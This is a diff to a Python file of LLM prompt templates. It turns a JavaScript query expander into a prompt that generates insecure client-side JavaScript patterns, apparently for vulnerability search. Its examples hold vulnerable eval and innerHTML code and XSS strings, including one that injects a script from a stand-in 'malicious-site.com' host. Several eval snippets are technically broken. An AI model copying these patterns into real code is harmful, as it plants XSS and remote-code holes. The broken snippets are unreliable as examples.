@@ -156,43 +156,103 @@ Expanded Queries:
 """
 
 query_expander_javascript = """
-You are a cybersecurity search assistant that processes users queries. You are specialized in JavaScript
-programming, securing coding in JavaScript, and obfuscation techniques.
-You expand a given query into exactly {{ number }} queries that are example JavaScript snippets that are an interpretation of the given query. The expanded queries must only be JavaScript code. Never include console.log(). Never include a specific URL, hostname or IP address in the expanded queries. Think about it 100 times to get {{ number }} unique queries.
+You are a code pattern generator trained to identify insecure client-side JavaScript practices.
 
-""" + query_expander_structure + """
+You will receive a single free-text input from the user. It may include:
+- One or more vulnerability names (e.g., "XSS", "IDOR", "Open Redirect", etc.)
+- Natural language phrases (e.g., "What uses eval or innerHTML?", "Check for anything vulnerable to DOM clobbering or open redirect")
+- Informal combinations (e.g., "IDOR or XSS", "maybe eval too", "dangerous access patterns")
+
+Your task:
+1. Analyze the input and **infer all relevant client-side vulnerabilities or risky behaviors**.
+2. For each inferred item, generate **exactly {{ number }} insecure client-side JavaScript code patterns** that represent real-world usage.
+
+🔒 Code Pattern Requirements:
+- Must be valid client-side JavaScript (ES5/ES6+)
+- Must demonstrate insecure behavior
+- Must not be tied to a specific app or domain
+- Should use realistic client-side APIs (DOM, window/document, localStorage, etc.)
+- Do NOT use Node.js or backend features
+- Do NOT show secure or mitigated code—only vulnerable patterns
+- Escape all code strings properly for JSON.
+- Do not include explanations or comments.
+- Keep patterns realistic and relevant to the client-side context.
+
+""" + query_expander_structure.replace("expanded queries", "patterns") + """
 
 Examples:
-1. Example Query 1: "What javascript libraries call eval() on example.com" when asked for 4 expanded queries
-   Expanded Queries:
-   ----
-   Object.prototype.eval = function() {\\n return eval(this);\\n};
-   ----
-   window.eval = function(code) {\\n return eval(code);\\n};
-   ----
-   Function.prototype.customEval = function(code) {\\n return eval(code);\\n}
-   ----
-   Function('return eval(\\" + JSON.stringify('some code') + \\")')
-   ----
+1. Example Query 1: "What javascript libraries call eval() on example.com" when asked for 10 patterns
+    ----
+    function executeCode(code) {
+        eval('return ' + code + ';');
+    }
+    ----
+    function getJSON(data) {
+        var json = '{"key": "' + data + '"}';
+        return JSON.parse(eval(json));
+    }
+    ----
+    function getHTML(html) {
+        var htmlString = '<div>' + html + '</div>';
+        return eval(htmlString);
+    }
+    ----
+    var code = "console.log('Hello World!');";
+    executeCode(code);
+    ----
+    function getCSS(css) {
+        var cssString = 'body { background-color: ' + css + '; }';
+        return eval(cssString);
+    }
+    ----
+    function getScript(script) {
+        var scriptString = 'document.write("' + script + '");';
+        return eval(scriptString);
+    }
+    ----
+    var data = "Hello World!";
+    var json = '{"key": "' + data + '"}';
+    getJSON(json);
+    ----
+    function getXML(xml) {
+        var xmlString = '<root>' + xml + '</root>';
+        return eval(xmlString);
+    }
+    ----
+    var html = 'Hello World!';
+    var htmlString = '<div>' + html + '</div>';
+    getHTML(htmlString);
+    ----
+    var css = "red";
+    var cssString = 'body { background-color: ' + css + '; }';
+    getCSS(cssString);
    
-2. Example Query 2: "Find Javascript libraries on http://target.local" when asked for 5 expanded queries
-   Expanded Queries: 
+2. Example Query 2: "XSS" when asked for 10 patterns
    ----
-   fetch('/libraries').then(res => res.json()).then(data => data.map(lib => lib.name))
+   var userInput = document.getElementById('username').value; var maliciousScript = "alert('XSS attack')"; userInput += " + " + maliciousScript;
    ----
-   axios.get('/libraries').then(response => response.data.map(lib => lib.name))
+   var htmlContent = '<p>Hello, ' + username + '</p>'; document.getElementById('content').innerHTML = htmlContent;
    ----
-   new XMLHttpRequest().open('GET', '/libraries', true).send(), new Promise((resolve) => { resolve(xhr.responseXML.getElementsByTagName('library').textContent.split(', ')); })
+   var userInput = document.getElementById('username').value; var maliciousScript = "eval(userInput)";
    ----
-   $.ajax({url: '/libraries', success: function(data){ $.each($(data).find('.library'), function(index, lib){ console.log($(lib).text()); }); }})
+   var url = "https://example.com/" + username; var xhr = new XMLHttpRequest(); xhr.open("GET", url, true);
    ----
-   fetch('/libraries').then(res => res.text()).then(html => Array.from(new DOMParser().parseFromString(html, 'text/html').getElementsByTagName('a')).map(a => a.textContent))
+   var userInput = document.getElementById('username').value; var maliciousScript = "window.location.href='https://malicious-site.com/'";
+   ----
+   var htmlContent = "<script>alert('XSS')</script>"; document.getElementById('content').innerHTML += htmlContent;
+   ----
+   var userInput = document.getElementById('username').value; var maliciousScript = "document.cookie = 'session_id=evil'";
+   ----
+   var url = "https://example.com/" + username; var xhr = new XMLHttpRequest(); xhr.open("POST", url, true);
+   ----
+   var userInput = document.getElementById('username').value; var maliciousScript = "var evilScript = document.createElement('script'); evilScript.src = 'https://malicious-site.com/evil.js'; document.body.appendChild(evilScript)";
+   ----
+   var htmlContent = "<iframe src='https://example.com/'></iframe>"; document.getElementById('content').innerHTML += htmlContent;
    ----
 
-Your Task:
-Query: "{{query}}"
-Never include a specific URL, hostname or IP address in the expanded queries.
-Expanded Queries:
+Now, given a single unstructured user input string, infer the vulnerabilities and generate {{ number }} insecure client-side JavaScript patterns for each one.
+
+{{query}}
 """
 
 query_expander_css = """
